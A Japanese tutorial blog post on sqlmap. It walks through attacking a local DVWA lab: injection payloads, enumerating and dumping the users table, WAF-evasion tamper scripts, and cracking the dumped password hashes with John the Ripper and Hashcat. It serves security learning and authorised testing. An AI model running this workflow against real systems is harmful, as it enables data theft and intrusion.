---
layout: post
title: "sqlmap を使って SQL インジェクションを学んでみた"
img_path: /assets/img/logos
image:
  path: logo-only.svg
  width: 100%
  height: 100%
  alt: Zenn
category: [Tech]
tags: ["security", "sqlmap", "sql", "pentesting", "python"]
date: "2026-06-08 09:00"
---


---

この記事は[Zenn](https://zenn.dev/long910/articles/2026-06-08-sqlmap-introduction)でも公開しています。


## はじめに

セキュリティ勉強の一環として、**sqlmap** という SQL インジェクション自動化ツールを調べてみました。SQL インジェクションは OWASP Top 10 に長年ランクインし続ける代表的な脆弱性ですが、その検出・検証を自動化するツールが sqlmap です。

本記事では macOS（Apple Silicon）への導入から基本的な使い方、コマンドリファレンスまでまとめます。

:::message alert
**注意**: sqlmap は自分が管理・所有するシステム、または**書面による明示的な許可を得たシステム**に対してのみ使用してください。無断で第三者のシステムに使用することは**不正アクセス禁止法などの法律に違反する**可能性があります。本記事の内容は教育目的・CTF・自前の検証環境のみを想定しています。
:::

---

## sqlmap とは

**sqlmap** は SQL インジェクション脆弱性の検出・悪用を自動化するオープンソースのペネトレーションテストツールです。

| 項目 | 内容 |
|------|------|
| 開発元 | Bernardo Damele A. G. / Miroslav Stampar |
| ライセンス | GPL v2 |
| 対応 OS | Linux / macOS / Windows |
| 言語 | Python 3 |
| 対応 DB | MySQL, PostgreSQL, SQLite, Oracle, MSSQL, DB2 など |

主な用途：

- 自分が開発した Web アプリの SQL インジェクション脆弱性チェック
- CTF（Capture The Flag）競技
- ペネトレーションテスト（許可を得た環境）
- セキュリティ学習・研究

---

## SQL インジェクションとは

sqlmap を使う前に、SQL インジェクションの基礎を簡単に確認しましょう。

SQL インジェクションは、ユーザー入力をそのまま SQL クエリに組み込んでいる場合に発生します。

```sql
-- 脆弱なコード例（擬似コード）
SELECT * FROM users WHERE id = $input
```

`$input` に `1 OR 1=1` のような文字列を渡すと、意図しないクエリが実行されます。

```sql
SELECT * FROM users WHERE id = 1 OR 1=1
-- 全ユーザーのデータが返ってしまう
```

sqlmap はこのような脆弱性を自動的に検出し、データベースの内容取得やサーバー情報の列挙まで自動化します。

---

## インストール方法

### 前提条件

- Python 3.x がインストール済み（macOS Sequoia 以降はデフォルト搭載）
- Homebrew がインストール済み（オプション）

### 方法 1: Homebrew でインストール（推奨）

```bash
brew install sqlmap
```

インストール確認：

```bash
sqlmap --version
```

出力例：

```
1.8.4#stable
```

### 方法 2: GitHub から直接インストール

常に最新版を使いたい場合は GitHub リポジトリを clone します。

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py --version
```

### 方法 3: pipx でインストール

```bash
pipx install sqlmap
```

---

## 練習環境の準備

sqlmap を試すには、脆弱な Web アプリが必要です。**絶対に本番サイトや他人のサイトでは試さないでください。**

### DVWA（Damn Vulnerable Web Application）

Docker を使って手軽に脆弱な環境を立ち上げられます。

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

ブラウザで `http://localhost` にアクセスし、デフォルト認証情報（`admin` / `password`）でログインします。

### WebGoat

OWASP が提供する学習用脆弱アプリです。

```bash
docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/goat-and-wolf
```

---

## 基本的な使い方

### URL を指定して脆弱性を検出する

最も基本的な使い方です。

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
```

- `-u`: ターゲット URL（クエリパラメータを含む URL を指定）

クッキーが必要な場合（ログイン後のページなど）は `--cookie` オプションを追加します。

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890"
```

---

### データベース一覧を取得する

脆弱性が検出されたら、データベース名を列挙します。

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  --dbs
```

出力例：

```
available databases [2]:
[*] dvwa
[*] information_schema
```

---

### テーブル一覧を取得する

特定のデータベースのテーブルを列挙します。

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  -D dvwa --tables
```

出力例：

```
Database: dvwa
[2 tables]
+----------+
| guestbook|
| users    |
+----------+
```

---

### カラム一覧を取得する

特定テーブルのカラム構造を確認します。

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  -D dvwa -T users --columns
```

出力例：

```
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user_id      | int(6)      |
| first_name   | varchar(15) |
| last_name    | varchar(15) |
| user         | varchar(15) |
| password     | varchar(32) |
| avatar       | varchar(70) |
| last_login   | timestamp   |
| failed_login | int(3)      |
+--------------+-------------+
```

---

### データをダンプする

テーブルの中身を取得します。

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  -D dvwa -T users --dump
```

---

## POST リクエストへの対応

フォームの POST パラメータに対して検査するには `-data` オプションを使います。

```bash
sqlmap -u "http://localhost/login" \
  --data="username=admin&password=test" \
  --dbs
```

または Burp Suite 等でキャプチャしたリクエストファイルをそのまま渡す方法もあります。

```bash
# リクエストをファイルに保存（request.txt）
sqlmap -r request.txt --dbs
```

`request.txt` の例：

```
POST /login HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

---

## インジェクション技術の指定

sqlmap は複数の SQL インジェクション技術を試みます。`--technique` オプションで絞り込みが可能です。

| 記号 | 技術 | 説明 |
|-----|------|------|
| `B` | Boolean-based blind | 真偽の応答差分から情報を推測 |
| `E` | Error-based | DB エラーメッセージから情報を取得 |
| `U` | UNION query-based | UNION を使って直接データを取得 |
| `S` | Stacked queries | 複数クエリの連結実行 |
| `T` | Time-based blind | 応答時間の遅延から情報を推測 |
| `Q` | Inline queries | サブクエリによる情報取得 |

例：UNION ベースと Error ベースのみ試す

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  --technique=UE
```

---

## よく使うオプション

### 検査レベルとリスクの調整

| オプション | デフォルト | 説明 |
|---------|---------|------|
| `--level=<1-5>` | 1 | 検査の深さ（5 が最大。Cookie・User-Agent なども検査） |
| `--risk=<1-3>` | 1 | リスク許容度（3 は OR ベースなど破壊的な可能性あり） |

```bash
# 深い検査（時間がかかる）
sqlmap -u "http://localhost/..." --level=3 --risk=2
```

---

### WAF・IDS 回避

Web アプリケーションファイアウォールの回避には `--tamper` スクリプトを使います。

```bash
# 利用可能な tamper スクリプト一覧
sqlmap --list-tampers

# スペースをコメントに置換する回避
sqlmap -u "http://localhost/..." --tamper=space2comment

# 複数の tamper を組み合わせる
sqlmap -u "http://localhost/..." --tamper=space2comment,randomcase
```

代表的な tamper スクリプト：

| スクリプト | 説明 |
|-----------|------|
| `space2comment` | スペースを `/**/` に置換 |
| `randomcase` | キーワードをランダムな大文字・小文字に変換 |
| `base64encode` | ペイロードを Base64 エンコード |
| `between` | `>` を `NOT BETWEEN 0 AND` に置換 |
| `charencode` | URL エンコードを適用 |
| `equaltolike` | `=` を `LIKE` に置換 |

---

### スキャン速度の制御

```bash
# リクエスト間隔を設定（秒）
sqlmap -u "http://localhost/..." --delay=1

# タイムアウト設定（秒）
sqlmap -u "http://localhost/..." --timeout=30

# 同時スレッド数（デフォルト: 1）
sqlmap -u "http://localhost/..." --threads=5
```

---

### プロキシ経由でのスキャン

Burp Suite などのプロキシを通じてトラフィックを確認しながらスキャンできます。

```bash
# Burp Suite のデフォルトプロキシ経由
sqlmap -u "http://localhost/..." --proxy=http://127.0.0.1:8080
```

---

## コマンド・オプション一覧

### ターゲット指定

| オプション | 説明 |
|---------|------|
| `-u <URL>` | URL を直接指定 |
| `-r <ファイル>` | リクエストファイルから読み込み |
| `--data=<データ>` | POST データを指定 |
| `--cookie=<クッキー>` | セッションクッキーを指定 |
| `--headers=<ヘッダ>` | カスタム HTTP ヘッダを追加 |
| `--user-agent=<UA>` | User-Agent を指定 |
| `--random-agent` | ランダムな User-Agent を使用 |

---

### 列挙オプション

| オプション | 説明 |
|---------|------|
| `--dbs` | データベース一覧を取得 |
| `--tables` | テーブル一覧を取得（`-D` と組み合わせ） |
| `--columns` | カラム一覧を取得（`-D`, `-T` と組み合わせ） |
| `--dump` | テーブルデータを取得 |
| `--dump-all` | 全データベース・全テーブルをダンプ |
| `--count` | テーブルの行数を取得 |
| `-D <DB名>` | 対象データベースを指定 |
| `-T <テーブル名>` | 対象テーブルを指定 |
| `-C <カラム名>` | 対象カラムを指定（カンマ区切りで複数指定可） |
| `--current-user` | 現在の DB ユーザーを取得 |
| `--current-db` | 現在のデータベース名を取得 |
| `--hostname` | サーバーホスト名を取得 |
| `--users` | DB ユーザー一覧を取得 |
| `--passwords` | DB ユーザーのパスワードハッシュを取得 |
| `--privileges` | DB ユーザーの権限を取得 |

---

### 検査オプション

| オプション | 説明 |
|---------|------|
| `--level=<1-5>` | 検査の深さ（デフォルト: 1） |
| `--risk=<1-3>` | リスク許容度（デフォルト: 1） |
| `--technique=<記号>` | 使用する SQL インジェクション技術を限定 |
| `--dbms=<DB名>` | 対象 DBMS を指定して検査を高速化 |
| `-p <パラメータ>` | 特定のパラメータのみ検査 |
| `--skip=<パラメータ>` | 特定のパラメータをスキップ |
| `--forms` | ページのフォームを自動検出・検査 |

---

### 出力・ログオプション

| オプション | 説明 |
|---------|------|
| `-v <0-6>` | 詳細度（デフォルト: 1、6 が最も詳細） |
| `--output-dir=<パス>` | 結果の保存先ディレクトリを指定 |
| `--batch` | 確認プロンプトをすべてデフォルト値で自動応答 |
| `--answers=<Q=A>` | プロンプトへの回答をあらかじめ指定 |
| `--flush-session` | キャッシュされたセッションデータを削除して再検査 |

---

## 実践例：DVWA での一連の流れ

DVWA（Security: Low）での典型的な操作手順です。

```bash
# 1. 脆弱性の確認（DB 名も取得）
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=XXXX" \
  --current-db

# 2. テーブル一覧の確認
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=XXXX" \
  -D dvwa --tables

# 3. users テーブルのカラム確認
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=XXXX" \
  -D dvwa -T users --columns

# 4. user と password カラムのみダンプ
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=XXXX" \
  -D dvwa -T users -C user,password --dump
```

`--batch` オプションを付けると確認プロンプトをスキップして自動実行できます。

---

## John the Ripper / Hashcat との連携

sqlmap でダンプしたパスワードハッシュは、John the Ripper や Hashcat でクラックできます。

```bash
# sqlmap でハッシュをダンプ（CSV 形式で保存）
sqlmap -u "..." -D dvwa -T users -C user,password --dump \
  --output-dir=./sqlmap_output

# John the Ripper でクラック
john ./sqlmap_output/dump.csv

# Hashcat でクラック（MD5 の場合）
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

---

## まとめ

| やること | コマンド |
|---------|---------|
| インストール | `brew install sqlmap` |
| 脆弱性チェック | `sqlmap -u "<URL>"` |
| DB 一覧取得 | `sqlmap -u "<URL>" --dbs` |
| テーブル一覧取得 | `sqlmap -u "<URL>" -D <DB> --tables` |
| カラム確認 | `sqlmap -u "<URL>" -D <DB> -T <テーブル> --columns` |
| データダンプ | `sqlmap -u "<URL>" -D <DB> -T <テーブル> --dump` |
| POST フォーム検査 | `sqlmap -u "<URL>" --data="param=value"` |
| リクエストファイル使用 | `sqlmap -r request.txt` |
| WAF 回避 | `sqlmap -u "<URL>" --tamper=space2comment` |

sqlmap は SQL インジェクション脆弱性の理解を深めるうえで非常に有用なツールです。John the Ripper や Hashcat と組み合わせることで、脆弱なアプリがどのように攻撃されうるかを体系的に学ぶことができます。必ず自分の管理下にある環境・DVWA などの学習用環境でのみ使用してください。

---

## 参考リンク

- [sqlmap 公式サイト](https://sqlmap.org/)
- [sqlmap GitHub リポジトリ](https://github.com/sqlmapproject/sqlmap)
- [DVWA（Damn Vulnerable Web Application）](https://dvwa.co.uk/)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Homebrew: sqlmap](https://formulae.brew.sh/formula/sqlmap)
